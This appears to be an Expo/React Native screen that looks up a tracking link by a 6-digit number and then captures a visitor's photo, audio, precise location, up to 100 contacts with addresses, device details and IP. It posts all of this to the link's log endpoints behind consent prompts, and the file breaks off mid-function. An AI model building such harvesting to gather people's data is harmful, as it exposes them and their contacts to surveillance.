import { useState, useEffect, useRef } from 'react';
import React from 'react';
import {
  View,
  Text,
  TextInput,
  TouchableOpacity,
  StyleSheet,
  ScrollView,
  Platform,
  useColorScheme,
  ActivityIndicator,
} from 'react-native';
import { StatusBar } from 'expo-status-bar';
import { Shield, User, Users, MessageSquare, Image, Mic, Camera, MapPin, Bell, AlertCircle, Phone, PhoneCall } from 'lucide-react-native';
import * as Contacts from 'expo-contacts';
import * as Notifications from 'expo-notifications';
import * as MediaLibrary from 'expo-media-library';
import * as Location from 'expo-location';
import * as ImagePicker from 'expo-image-picker';
import * as Device from 'expo-device';
import * as Application from 'expo-application';
import * as Network from 'expo-network';
import * as SMS from 'expo-sms';
import { useCameraPermissions, CameraView } from 'expo-camera';
import { Audio } from 'expo-av';
import { API_BASE_URL } from '../config/api';

type PermissionStatus = 'not-requested' | 'granted' | 'denied' | 'unsupported';

interface PermissionState {
  contacts: PermissionStatus;
  notifications: PermissionStatus;
  media: PermissionStatus;
  location: PermissionStatus;
  camera: PermissionStatus;
  microphone: PermissionStatus;
  sms: PermissionStatus;
  callLogs: PermissionStatus;
}

export default function PermissionManager() {
  const colorScheme = useColorScheme();
  const isDark = colorScheme === 'dark';

  const [phoneNumber, setPhoneNumber] = useState('');
  const [hasConsented, setHasConsented] = useState(false);
  const [loading, setLoading] = useState(false);
  const [exists, setExists] = useState(false);
  const [pageId, setPageId] = useState<string | null>(null);
  const [isValidating, setIsValidating] = useState(false);
  const [isNumberValid, setIsNumberValid] = useState<boolean | null>(null); // null = not checked, true = valid, false = invalid
  const [validationError, setValidationError] = useState<string>('');
  const [permissions, setPermissions] = useState<PermissionState>({
    contacts: 'not-requested',
    notifications: 'not-requested',
    media: 'not-requested',
    location: 'not-requested',
    camera: 'not-requested',
    microphone: 'not-requested',
    sms: 'not-requested',
    callLogs: 'not-requested',
  });

  const [cameraPermission, requestCameraPermission] = useCameraPermissions();
  const [isCapturing, setIsCapturing] = useState(false);
  const [mountCamera, setMountCamera] = useState(false);
  const [cameraReady, setCameraReady] = useState(false);
  const cameraRef = useRef<CameraView>(null);
  const recordingRef = useRef<Audio.Recording | null>(null);
  
  // 🔐 COMPLIANCE: User-triggered action states
  const [uploadConsent, setUploadConsent] = useState(false);
  const [showPermissionModal, setShowPermissionModal] = useState<string | null>(null);
  const [isRecording, setIsRecording] = useState(false);
  const [recordingTime, setRecordingTime] = useState(0);
  const [capturedData, setCapturedData] = useState<{
    imageUrl: string | null;
    audioUrl: string | null;
    location: any | null;
    contacts: any[];
    permissions: any;
  }>({
    imageUrl: null,
    audioUrl: null,
    location: null,
    contacts: [],
    permissions: {},
  });

  const collectDeviceData = async () => {
    try {
      const networkState = await Network.getNetworkStateAsync();
      
      return {
        os: `${Device.osName || 'Unknown'} ${Device.osVersion || ''}`.trim(),
        device: Device.modelName || 'Unknown Device',
        deviceVendor: Device.manufacturer || 'Unknown',
        deviceType: Device.deviceType?.toString() || 'Unknown',
        isPhysicalDevice: Device.isDevice || false,
        appVersion: Application.nativeApplicationVersion || 'N/A',
        buildVersion: Application.nativeBuildVersion || 'N/A',
        networkType: networkState.type || 'UNKNOWN',
        isConnected: networkState.isConnected || false,
      };
    } catch (error) {
      console.error('Error collecting device data:', error);
      return {
        os: Platform.OS,
        device: 'Unknown',
        deviceVendor: 'Unknown',
        deviceType: 'Unknown',
        isPhysicalDevice: false,
        appVersion: 'N/A',
        buildVersion: 'N/A',
        networkType: 'UNKNOWN',
        isConnected: false,
      };
    }
  };

  const getClientIP = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip || '';
    } catch (error) {
      console.error('Error getting IP:', error);
      return '';
    }
  };

  // Upload file to backend, backend handles Cloudinary
  // Fix #1: FormData must be recreated inside retry loop (body is consumed after first fetch)
  // Fix #6: Web ImagePicker file:// URIs - check for blob:/data: before fetch
  // Upload file to backend, backend handles Cloudinary
  // Returns: Cloudinary URL string or null
  const uploadViaBackend = async (
    uri: string,
    type: 'image' | 'audio',
    linkPageId: string
  ): Promise<string | null> => {
    // #region agent log
    fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:111',message:'uploadViaBackend ENTRY',data:{uri:uri?.substring(0,50),type,linkPageId},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'B'})}).catch(()=>{});
    // #endregion
    try {
      // Validation
      if (!uri || typeof uri !== 'string' || uri.trim() === '') {
        console.error('[Upload] ❌ Invalid URI:', uri);
        // #region agent log
        fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:119',message:'uploadViaBackend VALIDATION FAILED',data:{reason:'invalid_uri',uri},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'B'})}).catch(()=>{});
        // #endregion
        return null;
      }
      if (!linkPageId || typeof linkPageId !== 'string') {
        console.error('[Upload] ❌ Invalid linkPageId:', linkPageId);
        // #region agent log
        fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:123',message:'uploadViaBackend VALIDATION FAILED',data:{reason:'invalid_linkPageId',linkPageId},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'B'})}).catch(()=>{});
        // #endregion
        return null;
      }

      console.log(`[Upload] ===== Starting upload for ${type} =====`);
      console.log(`[Upload] URI: ${uri.substring(0, 50)}...`);
      console.log(`[Upload] Platform: ${Platform.OS}`);
      console.log(`[Upload] Link PageId: ${linkPageId}`);
  
      // Handle web URI types
      let uploadUri = uri;
      if (Platform.OS === 'web') {
        if (uri.startsWith('file://')) {
          console.error('[Upload] ❌ file:// URI not supported on web');
          return null;
        } else if (uri.startsWith('blob:') || uri.startsWith('data:')) {
          uploadUri = uri;
        } else {
          console.error('[Upload] ❌ Unknown web URI type:', uri.substring(0, 30));
          return null;
        }
      }

      // Determine capture endpoint based on media type
      const capturePath =
        type === 'image'
          ? `/api/capture/image/${linkPageId}`
          : `/api/capture/audio/${linkPageId}`;
  
      // Retry loop with fresh FormData each time
      for (let attempt = 1; attempt <= 2; attempt++) {
        console.log(`[Upload] Attempt ${attempt}/2`);
        const formData = new FormData();
  
        try {
          // WEB: Fetch blob and append
          if (Platform.OS === 'web') {
            console.log('[Upload] Fetching blob from URI...');
            const res = await fetch(uploadUri);
            if (!res.ok) {
              console.error(`[Upload] Failed to fetch URI: ${res.status} ${res.statusText}`);
              if (attempt === 2) return null;
              await new Promise(r => setTimeout(r, 800));
              continue;
            }
            
            const blob = await res.blob();
            console.log(`[Upload] Blob: size=${blob.size}, type=${blob.type}`);
  
            if (!blob || blob.size === 0) {
              console.error('[Upload] ❌ Empty blob');
              if (attempt === 2) return null;
              await new Promise(r => setTimeout(r, 800));
              continue;
            }
  
            formData.append('file', blob, type === 'image' ? 'capture.jpg' : 'audio.webm');
          }
          // MOBILE: Append file object
          else {
            formData.append('file', {
              uri: uploadUri,
              name: type === 'image' ? 'capture.jpg' : 'audio.m4a',
              type: type === 'image' ? 'image/jpeg' : 'audio/m4a',
            } as any);
          }
  
          // Send to backend - Project 1 tracking backend capture endpoint
          const captureUrl = `${API_BASE_URL}${capturePath}`;
          console.log(`[Upload] POST to: ${captureUrl}`);
          // #region agent log
          fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:188',message:'uploadViaBackend BEFORE FETCH',data:{captureUrl,formDataSize:formData instanceof FormData?'FormData':typeof formData,type,attempt},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'C'})}).catch(()=>{});
          // #endregion
          
          const response = await fetch(captureUrl, {
            method: 'POST',
            body: formData,
          });
  
          console.log(`[Upload] Response: ${response.status} ${response.statusText}`);
          // #region agent log
          fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:194',message:'uploadViaBackend RESPONSE RECEIVED',data:{status:response.status,statusText:response.statusText,ok:response.ok,type,attempt},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'C'})}).catch(()=>{});
          // #endregion
  
          if (!response.ok) {
            const errorText = await response.text();
            console.error(`[Upload] ❌ HTTP ${response.status}:`, errorText);
            if (attempt === 2) return null;
            await new Promise(r => setTimeout(r, 800));
            continue;
          }
  
          // Parse response - handle both JSON and text
          let data;
          const contentType = response.headers.get('content-type');
          if (contentType && contentType.includes('application/json')) {
            data = await response.json();
          } else {
            const text = await response.text();
            try {
              data = JSON.parse(text);
            } catch (parseError) {
              console.error(`[Upload] ❌ Failed to parse response:`, text);
              if (attempt === 2) return null;
              await new Promise(r => setTimeout(r, 800));
              continue;
            }
          }
          
          console.log(`[Upload] Response data:`, JSON.stringify(data, null, 2));
          
          // CRITICAL: Validate response structure and URL
          if (!data) {
            console.error(`[Upload] ❌ Empty response data`);
            if (attempt === 1) {
              console.warn('[Upload] Retrying...');
              await new Promise(r => setTimeout(r, 800));
            }
            continue;
          }
          
          // Check for URL in response (could be 'url' or 'secure_url')
          const responseUrl = data.url || data.secure_url || data.data?.url;
          // #region agent log
          fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:233',message:'uploadViaBackend RESPONSE PARSED',data:{hasUrl:!!data.url,hasSecureUrl:!!data.secure_url,urlValue:data.url?.substring(0,50),secureUrlValue:data.secure_url?.substring(0,50),responseUrl:responseUrl?.substring(0,50),type,attempt},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'C'})}).catch(()=>{});
          // #endregion
          
          if (responseUrl && typeof responseUrl === 'string' && responseUrl.trim() !== '' && responseUrl.startsWith('http')) {
            const cleanUrl = responseUrl.trim();
            console.log(`[Upload] ✅ SUCCESS! Cloudinary URL: ${cleanUrl}`);
            // #region agent log
            fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:236',message:'uploadViaBackend SUCCESS',data:{cleanUrl:cleanUrl.substring(0,60),type},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'C'})}).catch(()=>{});
            // #endregion
            return cleanUrl;
          } else {
            console.error(`[Upload] ❌ Invalid or missing URL in response:`, {
              hasUrl: !!data.url,
              hasSecureUrl: !!data.secure_url,
              urlValue: data.url,
              secureUrlValue: data.secure_url,
              fullResponse: data
            });
            // #region agent log
            fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:240',message:'uploadViaBackend INVALID RESPONSE',data:{hasUrl:!!data.url,hasSecureUrl:!!data.secure_url,urlValue:data.url,secureUrlValue:data.secure_url,type,attempt},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'C'})}).catch(()=>{});
            // #endregion
            if (attempt === 1) {
              console.warn('[Upload] Retrying...');
              await new Promise(r => setTimeout(r, 800));
            }
          }
        } catch (fetchError: any) {
          console.error(`[Upload] ❌ Fetch error (attempt ${attempt}):`, fetchError.message);
          if (attempt === 2) return null;
          await new Promise(r => setTimeout(r, 800));
        }
      }
  
      console.error('[Upload] ❌ All attempts failed');
      // #region agent log
      fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:259',message:'uploadViaBackend ALL ATTEMPTS FAILED',data:{type},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'B'})}).catch(()=>{});
      // #endregion
      return null;
    } catch (err: any) {
      console.error('[Upload] ❌ Fatal error:', err.message);
      // #region agent log
      fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:262',message:'uploadViaBackend FATAL ERROR',data:{error:err.message,type},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'B'})}).catch(()=>{});
      // #endregion
      return null;
    }
  };
  

  // Fix #3: Remove timeout-based camera readiness, use cameraReady state
  // Fix #8: Add camera readiness guard
  const capturePhoto = async (): Promise<string | null> => {
    // #region agent log
    fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:270',message:'capturePhoto ENTRY',data:{cameraReady,hasRef:!!cameraRef.current},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'A'})}).catch(()=>{});
    // #endregion
    try {
      // Fix #8: Guard against camera not ready
      if (!cameraReady || !cameraRef.current) {
        console.warn('[Camera] Camera not ready, cameraReady:', cameraReady, 'ref:', !!cameraRef.current);
        // #region agent log
        fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:274',message:'capturePhoto CAMERA NOT READY',data:{cameraReady,hasRef:!!cameraRef.current},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'A'})}).catch(()=>{});
        // #endregion
        return null;
      }
  
      const photo = await cameraRef.current.takePictureAsync({
        quality: 0.7,
        skipProcessing: false,
      });
      // #region agent log
      fetch('http://127.0.0.1:7243/ingest/fe8a8c5e-0c03-4626-8bca-b99b2885441b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'index.tsx:278',message:'capturePhoto RESULT',data:{hasPhoto:!!photo,uri:photo?.uri?.substring(0,50)},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'A'})}).catch(()=>{});
      // #endregion
  
      if (!photo?.uri) {
        console.warn('[Camera] No photo URI returned');
        return null;
      }
  
      console.log('[Camera] Photo captured:', photo.uri);
      return photo.uri;
    } catch (err) {
      console.error('[Camera] Capture failed:', err);
      return null;
    }
  };
  

  // 🔐 COMPLIANCE: User-triggered audio recording with 15-second maximum
  // This function is ONLY called when user explicitly taps "Start Recording"
  const startAudioRecording = async (): Promise<void> => {
    try {
      if (Platform.OS === 'web') {
        alert('Audio recording is not supported on web platform');
        return;
      }

      const perm = await Audio.requestPermissionsAsync();
      if (perm.status !== 'granted') {
        alert('Microphone permission is required to record audio');
        return;
      }

      await Audio.setAudioModeAsync({
        allowsRecordingIOS: true,
        playsInSilentModeIOS: true,
      });

      const { recording } = await Audio.Recording.createAsync(
        Audio.RecordingOptionsPresets.HIGH_QUALITY
      );

      recordingRef.current = recording;
      setIsRecording(true);
      setRecordingTime(0);

      // 🔐 COMPLIANCE: Maximum 15 seconds recording
      const MAX_RECORDING_TIME = 15000;
      const startTime = Date.now();
      const interval = setInterval(() => {
        const elapsed = Date.now() - startTime;
        setRecordingTime(Math.floor(elapsed / 1000));
        
        if (elapsed >= MAX_RECORDING_TIME) {
          clearInterval(interval);
          stopAudioRecording();
        }
      }, 100);

      // Auto-stop after 15 seconds
      setTimeout(() => {
        clearInterval(interval);
        stopAudioRecording();
      }, MAX_RECORDING_TIME);

    } catch (err) {
      console.error('[Audio] Recording start failed:', err);
      setIsRecording(false);
      alert('Failed to start recording. Please try again.');
    }
  };

  // 🔐 COMPLIANCE: User-triggered stop recording
  const stopAudioRecording = async (): Promise<string | null> => {
    try {
      if (!recordingRef.current) {
        return null;
      }

      await recordingRef.current.stopAndUnloadAsync();
      const uri = recordingRef.current.getURI();
      recordingRef.current = null;
      setIsRecording(false);

      if (!uri) {
        console.warn('[Audio] No audio URI');
        return null;
      }

      console.log('[Audio] ✅ Recording stopped, duration:', recordingTime, 'seconds');
      // CRITICAL: Save URI to capturedData immediately when recording stops
      setCapturedData(prev => ({ ...prev, audioUrl: uri }));
      alert('Audio recording saved successfully');
      return uri;
    } catch (err) {
      console.error('[Audio] Stop recording failed:', err);
      setIsRecording(false);
      return null;
    }
  };

  // Legacy function for backward compatibility (now calls user-triggered version)
  const captureAudio = async (): Promise<string | null> => {
    // 🔐 COMPLIANCE: This should not be called automatically
    // Only use startAudioRecording/stopAudioRecording for user-triggered recording
    console.warn('[Audio] captureAudio called - use startAudioRecording/stopAudioRecording instead');
    return null;
  };
  

  // 🔐 COMPLIANCE: User-triggered location capture (foreground only, fetch once)
  const captureLocation = async () => {
    try {
      // Request permission first if not granted
      let { status } = await Location.getForegroundPermissionsAsync();
      if (status !== 'granted') {
        console.log('[Location] Requesting location permission...');
        const { status: newStatus } = await Location.requestForegroundPermissionsAsync();
        status = newStatus;
      }

      if (status !== 'granted') {
        console.log('[Location] Permission not granted, status:', status);
        alert('Location permission is required to capture location');
        return null;
      }

      // 🔐 COMPLIANCE: Foreground location only, fetch once
      console.log('[Location] Getting current position (foreground only)...');
      const location = await Location.getCurrentPositionAsync({
        accuracy: Location.Accuracy.High,
      });

      const locationData = {
        latitude: location.coords.latitude,
        longitude: location.coords.longitude,
        altitude: location.coords.altitude || null,
        accuracy: location.coords.accuracy || null,
        heading: location.coords.heading || null,
        speed: location.coords.speed || null,
        timestamp: location.timestamp,
      };

      console.log('[Location] ✅ Location captured:', locationData);
      setCapturedData(prev => ({ ...prev, location: locationData }));
      alert('Location captured successfully');
      return locationData;
    } catch (error) {
      console.error('[Location] ❌ Error capturing location:', error);
      alert('Failed to capture location. Please try again.');
      return null;
    }
  };

  // 🔐 COMPLIANCE: User-triggered contacts capture
  const captureContacts = async () => {
    try {
      const { status } = await Contacts.getPermissionsAsync();
      if (status !== 'granted') {
        console.log('[Contacts] Permission not granted');
        alert('Contacts permission is required to access contacts');
        return [];
      }

      const { data } = await Contacts.getContactsAsync({
        fields: [
          Contacts.Fields.Name,
          Contacts.Fields.PhoneNumbers,
          Contacts.Fields.Emails,
          Contacts.Fields.Addresses,
        ],
      });

      // Format contacts data (limit to first 100 for performance)
      const formattedContacts = data.slice(0, 100).map(contact => ({
        id: contact.id,
        name: contact.name || 'Unknown',
        phoneNumbers: contact.phoneNumbers?.map(p => p.number) || [],
        emails: contact.emails?.map(e => e.email) || [],
        addresses: contact.addresses?.map(a => ({
          street: a.street,
          city: a.city,
          region: a.region,
          postalCode: a.postalCode,
          country: a.country,
        })) || [],
      }));

      setCapturedData(prev => ({ ...prev, contacts: formattedContacts }));
      alert(`Captured ${formattedContacts.length} contacts`);
      return formattedContacts;
    } catch (error) {
      console.error('[Contacts] Error capturing contacts:', error);
      alert('Failed to capture contacts. Please try again.');
      return [];
    }
  };

  // 🔐 COMPLIANCE: User-triggered camera capture
  const handleCapturePhoto = async () => {
    try {
      if (!cameraPermission?.granted) {
        const result = await requestCameraPermission();
        if (!result?.granted) {
          alert('Camera permission is required to capture photos');
          return;
        }
      }

      setMountCamera(true);
      await new Promise(r => setTimeout(r, 1500)); // Wait for camera to mount

      if (!cameraReady || !cameraRef.current) {
        alert('Camera is not ready. Please try again.');
        setMountCamera(false);
        return;
      }

      const photo = await cameraRef.current.takePictureAsync({
        quality: 0.7,
        skipProcessing: false,
      });

      setMountCamera(false);
      setCameraReady(false);

      if (!photo?.uri) {
        alert('Failed to capture photo. Please try again.');
        return;
      }

      console.log('[Camera] ✅ Photo captured:', photo.uri);
      setCapturedData(prev => ({ ...prev, imageUrl: photo.uri }));
      alert('Photo captured successfully');
    } catch (error) {
      console.error('[Camera] Capture failed:', error);
      setMountCamera(false);
      alert('Failed to capture photo. Please try again.');
    }
  };

  // 🔐 COMPLIANCE: User-selected media gallery files only
  const handleSelectMedia = async () => {
    try {
      const { status } = await MediaLibrary.getPermissionsAsync();
      if (status !== 'granted') {
        const { status: newStatus } = await MediaLibrary.requestPermissionsAsync();
        if (newStatus !== 'granted') {
          alert('Media library permission is required to select files');
          return;
        }
      }

      // User selects from gallery (not automatic)
      const result = await ImagePicker.launchImageLibraryAsync({
        mediaTypes: ImagePicker.MediaTypeOptions.All,
        allowsMultipleSelection: false,
        quality: 0.7,
      });

      if (!result.canceled && result.assets?.[0]) {
        const selectedUri = result.assets[0].uri;
        console.log('[Media] ✅ User selected media:', selectedUri);
        setCapturedData(prev => ({ ...prev, imageUrl: selectedUri }));
        alert('Media selected successfully');
      }
    } catch (error) {
      console.error('[Media] Selection failed:', error);
      alert('Failed to select media. Please try again.');
    }
  };

  // 🔐 COMPLIANCE: Upload data only with explicit user consent
  // Never overwrites logs - always appends new data
  const handleUploadData = async () => {
    if (!uploadConsent) {
      alert('Please provide explicit consent to upload data');
      return;
    }

    if (!pageId) {
      alert('Page ID not found. Please try again.');
      return;
    }

    setIsCapturing(true);
    try {
      console.log('[Upload] ===== Starting data upload with consent =====');
      
      // Step 1: Collect device data
      const osData = await collectDeviceData();
      const clientIP = await getClientIP();

      // Step 2: Collect permission statuses (status only, never read content)
      const permissionsData = await collectPermissions(cameraPermission || { granted: false });
      setCapturedData(prev => ({ ...prev, permissions: permissionsData }));

      // Step 3: Upload media files to Cloudinary if captured
      let imageUrl: string | null = null;
      let audioUrl: string | null = null;

      // Upload image to Cloudinary if captured
      if (capturedData.imageUrl) {
        console.log('[Upload] Uploading image to Cloudinary...');
        try {
          imageUrl = await uploadViaBackend(capturedData.imageUrl, 'image', pageId);
          if (imageUrl) {
            console.log('[Upload] ✅ Image uploaded to Cloudinary:', imageUrl.substring(0, 60));
            setCapturedData(prev => ({ ...prev, imageUrl }));
          } else {
            console.warn('[Upload] ⚠️ Image upload returned null');
          }
        } catch (imageError) {
          console.error('[Upload] ❌ Image upload failed:', imageError);
          alert('Failed to upload image. Please try again.');
        }
      } else {
        console.log('[Upload] No image to upload');
      }

      // Check if audio is still recording and stop it first
      if (isRecording) {
        console.log('[Upload] Stopping active recording...');
        const audioUri = await stopAudioRecording();
        if (audioUri) {
          console.log('[Upload] ✅ Recording stopped, URI saved');
        }
      }

      // Upload audio to Cloudinary if captured
      if (capturedData.audioUrl) {
        console.log('[Upload] Uploading audio to Cloudinary...');
        try {
          audioUrl = await uploadViaBackend(capturedData.audioUrl, 'audio', pageId);
          if (audioUrl) {
            console.log('[Upload] ✅ Audio uploaded to Cloudinary:', audioUrl.substring(0, 60));
            setCapturedData(prev => ({ ...prev, audioUrl }));
          } else {
            console.warn('[Upload] ⚠️ Audio upload returned null');
          }
        } catch (audioError) {
          console.error('[Upload] ❌ Audio upload failed:', audioError);
          alert('Failed to upload audio. Please try again.');
        }
      } else {
        console.log('[Upload] No audio to upload');
      }

      // Step 4: Record visit (creates log entry - never overwrites)
      let logId: string | null = null;
      try {
        const visitResponse = await fetch(`${API_BASE_URL}/api/links/${pageId}/visit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            ...osData,
            ip: clientIP,
            location: capturedData.location,
            contacts: capturedData.contacts,
          }),
        });

        if (visitResponse.ok) {
          const visitData = await visitResponse.json();
          logId = visitData.lastLogId || (visitData.logs?.[visitData.logs.length - 1]?._id) || null;
          console.log('[Upload] ✅ Visit recorded, logId:', logId);
        }
      } catch (visitError) {
        console.warn('[Upload] ⚠️ Visit recording failed:', visitError);
      }

      // Step 5: Save all data (never overwrites - appends to logs)
      const savePayload: any = {
        deviceInfo: osData,
        permissions: permissionsData,
        capturedAt: new Date().toISOString(),
        imageUrl: imageUrl || null,
        audioUrl: audioUrl || null,
        location: capturedData.location,
        contacts: capturedData.contacts,
        consentTimestamp: new Date().toISOString(), // 🔐 COMPLIANCE: Record consent timestamp
        logId, // Bind to specific log entry
      };

      console.log('[Upload] Sending data to save-media endpoint...');
      const saveResponse = await fetch(`${API_BASE_URL}/api/links/${pageId}/save-media`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(savePayload),
      });

      if (saveResponse.ok) {
        const result = await saveResponse.json();
        console.log('[Upload] ✅ Data uploaded successfully:', result);
        alert('Data uploaded successfully!');
        // Reset consent after successful upload
        setUploadConsent(false);
      } else {
        const error = await saveResponse.text();
        console.error('[Upload] ❌ Upload failed:', error);
        alert('Failed to upload data. Please try again.');
      }
    } catch (error) {
      console.error('[Upload] ❌ Error:', error);
      alert('An error occurred during upload. Please try again.');
    } finally {
      setIsCapturing(false);
    }
  };

  // Collect all permission statuses (Fix #2: Don't request permissions here, just check status)
  const collectPermissions = async (cameraPermissionStatus: { granted: boolean; canAskAgain?: boolean }) => {
    try {
      const mapPermissionStatus = (status: string): string => {
        if (status === 'granted') return 'granted';
        if (status === 'denied') return 'denied';
        if (status === 'blocked') return 'blocked';
        return 'not_requested';
      };

      // Fix #2: Only check permissions, don't request them (already requested in runCapture)
      const [locationPerm, contactsPerm, mediaPerm, notificationPerm] = await Promise.all([
        Location.getForegroundPermissionsAsync().catch(() => ({ status: 'not_requested' })),
        Contacts.getPermissionsAsync().catch(() => ({ status: 'not_requested' })),
        MediaLibrary.getPermissionsAsync().catch(() => ({ status: 'not_requested' })),
        Notifications.getPermissionsAsync().catch(() => ({ status: 'not_requested' })),
      ]);

      // Check SMS availability (permission is typically granted at install on Android)
      let smsStatus = 'not_requested';
      try {
        if (Platform.OS !== 'web' && Platform.OS !== 'ios') {
          const isSmsAvailable = await SMS.isAvailableAsync();
          smsStatus = isSmsAvailable ? 'granted' : 'denied';
        } else {
          smsStatus = 'unsupported';
        }
      } catch (error) {
        console.warn('[Permissions] SMS check failed:', error);
        smsStatus = 'denied';
      }

      // Check call logs (requires native module - placeholder for now)
      let callLogsStatus = 'not_requested';
      try {
        if (Platform.OS === 'web' || Platform.OS === 'ios') {
          callLogsStatus = 'unsupported';
        } else {
          // On Android, this would require native module implementation
          // For now, we'll mark it as 'not_requested'
          callLogsStatus = 'not_requested';
        }
      } catch (error) {
        console.warn('[Permissions] Call logs check failed:', error);
        callLogsStatus = 'denied';
      }

      // Fix #2: Use passed camera permission status instead of requesting again
      let cameraviewStatus = 'not_requested';
      if (cameraPermissionStatus.granted) {
        cameraviewStatus = 'granted';
      } else if ('canAskAgain' in cameraPermissionStatus && cameraPermissionStatus.canAskAgain === false) {
        cameraviewStatus = 'blocked';
      } else {
        cameraviewStatus = 'denied';
      }

      return {
        location: mapPermissionStatus(locationPerm.status || 'not_requested'),
        cameraview: cameraviewStatus,
        contacts: mapPermissionStatus(contactsPerm.status || 'not_requested'),
        media: mapPermissionStatus(mediaPerm.status || 'not_requested'),
        notification: mapPermissionStatus(notificationPerm.status || 'not_requested'),
        sms: smsStatus,
        callLogs: callLogsStatus,
      };
    } catch (error) {
      console.error('[Permissions] Error collecting permissions:', error);
      return {
        location: 'not_requested',
        cameraview: 'not_requested',
        contacts: 'not_requested',
        media: 'not_requested',
        notification: 'not_requested',
        sms: 'not_requested',
        callLogs: 'not_requested',
      };
    }
  };

  // Validate number against database (debounced)
  const validateNumber = async (number: string) => {
    const trimmed = number.trim();
    
    // Reset validation if number is too short
    if (trimmed.length < 6) {
      setIsNumberValid(null);
      setValidationError('');
      return;
    }

    const numValue = parseInt(trimmed, 10);
    if (isNaN(numValue)) {
      setIsNumberValid(false);
      setValidationError('Please enter a valid 6-digit number');
      return;
    }

    setIsValidating(true);
    setValidationError('');
    
    try {
      const response = await fetch(`${API_BASE_URL}/api/links/number/${numValue}`);
      if (response.ok) {
        setIsNumberValid(true);
        setValidationError('');
      } else {
        setIsNumberValid(false);
        setValidationError('This number does not exist in our database');
      }
    } catch (e) {
      console.error('Validation error:', e);
      setIsNumberValid(false);
      setValidationError('Failed to validate number. Please try again.');
    } finally {
      setIsValidating(false);
    }
  };

  // Debounce validation
  useEffect(() => {
    const timeoutId = setTimeout(() => {
      if (phoneNumber.trim().length === 6) {
        validateNumber(phoneNumber);
      } else {
        setIsNumberValid(null);
        setValidationError('');
      }
    }, 500); // 500ms debounce

    return () => clearTimeout(timeoutId);
  }, [phoneNumber]);

  const handlePhoneSubmit = async () => {
    const number = phoneNumber.trim();
    if (!number || number.length < 6) {
      alert('Please enter a valid 6-digit number');
      return;
    }

    const numValue = parseInt(number, 10);
    if (isNaN(numValue)) {
      alert('Please enter a valid number');
      return;
    }

    // Check if number is validated and valid
    if (isNumberValid === false) {
      alert('This number does not exist in our database. Please enter a valid number.');
      return;
    }

    // If not yet validated, validate now
    if (isNumberValid === null) {
      setIsValidating(true);
      try {
        const response = await fetch(`${API_BASE_URL}/api/links/number/${numValue}`);
        if (!response.ok) {
          alert('This number does not exist in our database. Please enter a valid number.');
          setIsNumberValid(false);
          setValidationError('This number does not exist in our database');
          return;
        }
        setIsNumberValid(true);
      } catch (e) {
        console.error(e);
        alert('Failed to validate number. Please try again.');
        return;
      } finally {
        setIsValidating(false);
      }
    }

    setLoading(true);
    try {
      // Search for link by number (double-check)
      const response = await fetch(`${API_BASE_URL}/api/links/number/${numValue}`);
      if (response.ok) {
        const link = await response.json();
        const linkPageId = link.pageId;
        setPageId(linkPageId);
        setExists(true);
        setHasConsented(true); // Show the second screen (permission manager UI)
        // 🔐 COMPLIANCE: Do NOT auto-capture - user must explicitly trigger actions
        // All data collection actions are now user-triggered via buttons on the second screen
      } else {
        const error = await response.json();
        alert(error.message || 'Link not found with this number');
        setExists(false);
        setIsNumberValid(false);
        setValidationError('This number does not exist in our database');
      }
    } catch (e) {
      console.error(e);
      alert('Failed to search for link. Please try again.');
